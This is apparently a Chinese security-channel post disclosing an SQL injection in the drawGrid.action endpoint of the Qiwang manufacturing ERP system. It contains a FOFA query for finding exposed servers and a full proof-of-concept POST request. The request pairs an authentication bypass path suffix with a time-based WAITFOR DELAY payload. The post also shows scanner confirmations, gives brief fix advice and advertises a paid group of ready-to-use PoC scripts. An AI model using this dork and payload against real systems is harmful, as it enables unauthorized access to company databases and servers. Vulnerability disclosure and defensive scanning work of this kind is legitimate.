#  企望制造ERP系统 drawGrid.action SQL注入漏洞   
Superhero  nday POC   2024-11-26 02:05  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
企望制造ERP系统是一款专为制造企业设计的企业资源计划(ERP)软件，旨在优化企业的资源配置，提高运营效率，并增强企业的竞争力。系统集成了财务管理、生产管理、供应链管理、客户关系管理(CRM)、人力资源管理(HRM)等多个核心功能模块，能够全面覆盖企业的各项管理需求。该系统采用先进的技术架构和友好的用户界面设计，支持多终端操作，包括PC、手机、平板电脑等，确保用户能够随时随地访问系统，提高工作效率。  
  
  
**01******  
  
**漏洞概述**  
  
  
企望制造ERP系统 drawGrid.action 接口存在SQL注入漏洞，攻击者  
除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:   
```
"staff/cookieLogin.action"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8Hw55tsNGs1mJdl6DN9nCvzXy0koX5tSp2n2DSwdz0JgHw545FFrjLw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close

tablename=1';WAITFOR DELAY '0:0:5'--
```  
  
延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8yVQH1ra5PryTeD78pDufhqj4u55p84ibCmU9yPE5Kxic5DZN5YnUw2jg/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8wbUPfMzlFGwrhdibHHjqf3g3W8lSzIg06Mb4DHUxqhfcjJKWic6UKvMw/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8mXwSc3s6bTLvDJ9dBnP3DCCxbzlf3XtURbXK10tX4g4R82IClibeGOg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8BGticPNIAsVfP5Uv6qjw6RniaP090QL8ntoDXTDNwcMrPWROyfBGYMHA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKHamG4b68HPwCugGPQ35c8p4Gic5cOSActYgpIQXuGGxrQcmQDmtya4xSQ8HbG9Il03AlyjxQDFXA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、请及时联系官方更新最新补丁：http://www.wantit.com.cn/  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。   
  
2、三款工具都支持内置poc+自写poc目录一起扫描。   
  
3、保持每周更新10-15个poc。   
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
